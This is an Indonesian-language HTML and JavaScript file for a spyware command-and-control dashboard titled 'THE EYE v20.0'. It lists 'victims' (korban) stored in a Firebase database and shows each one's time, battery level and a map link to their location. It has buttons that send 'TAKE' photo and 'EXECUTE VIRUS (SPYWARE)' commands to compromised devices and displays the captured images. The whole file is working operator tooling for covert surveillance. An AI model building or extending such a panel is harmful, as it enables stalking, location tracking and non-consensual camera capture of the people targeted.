<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>THE EYE v20.0 - SUPREME COMMANDER</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; display: flex; }
        .sidebar { width: 300px; background: #111; height: 100vh; border-right: 2px solid #00ff00; padding: 20px; overflow-y: auto; }
        .main-view { flex-grow: 1; padding: 20px; overflow-y: auto; background: #050505; }
        .card { background: #1a1a1a; border: 1px solid #00ff00; padding: 15px; margin-bottom: 20px; border-radius: 5px; }
        button { background: #00ff00; color: black; border: none; padding: 10px; font-weight: bold; cursor: pointer; margin: 5px 0; width: 100%; }
        .btn-virus { background: #ff0000; color: white; }
        .img-box img { width: 100%; border: 1px solid #00ff00; margin-top: 10px; }
        h3 { border-bottom: 1px solid #00ff00; padding-bottom: 5px; }
    </style>
</head>
<body onload="initApp()">

<div class="sidebar">
    <h3>🛰️ TARGET LIST</h3>
    <div id="target-list">Menunggu mangsa...</div>
</div>

<div class="main-view" id="monitor">
    <h2>📡 MONITORING CENTER v20.0</h2>
    <p>Pilih target dari sidebar untuk melihat detail.</p>
</div>

<script>
    const firebaseConfig = { /* TEMPEL CONFIG LU DISINI */ };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function initApp() {
        db.ref('korban').on('value', snap => {
            const data = snap.val();
            let h = "";
            for(let id in data) {
                h += `<button onclick="viewTarget('${id}')">📍 ${data[id].waktu}</button>`;
            }
            document.getElementById('target-list').innerHTML = h;
        });
    }

    function viewTarget(id) {
        db.ref('korban/' + id).once('value', snap => {
            const k = snap.val();
            let html = `
                <div class="card">
                    <h3>INFO TARGET: ${id}</h3>
                    <p>🕒 Waktu: ${k.waktu} | 🔋 Bat: ${k.baterai}</p>
                    <p>🌍 Maps: <a href="${k.maps}" target="_blank" style="color:cyan">BUKA KOORDINAT</a></p>
                    <button onclick="sendCmd('${id}', 'TAKE')">📸 REQUEST FOTO SEKARANG</button>
                    <button class="btn-virus" onclick="sendCmd('${id}', 'VIRUS')">☣️ EXECUTE VIRUS (SPYWARE)</button>
                    <div id="photo-area-${id}" class="img-box">Memuat foto...</div>
                </div>`;
            document.getElementById('monitor').innerHTML = html;
            
            // Listen Foto
            db.ref('hasil_foto/' + id).on('value', fsnap => {
                const f = fsnap.val();
                if(f) document.getElementById(`photo-area-${id}`).innerHTML = `<img src="${f.foto}">`;
            });
        });
    }

    function sendCmd(id, action) {
        db.ref('commands/' + id).set({ action: action, t: Date.now() });
        alert("Command " + action + " Sent!");
    }
</script>
</body>
</html>
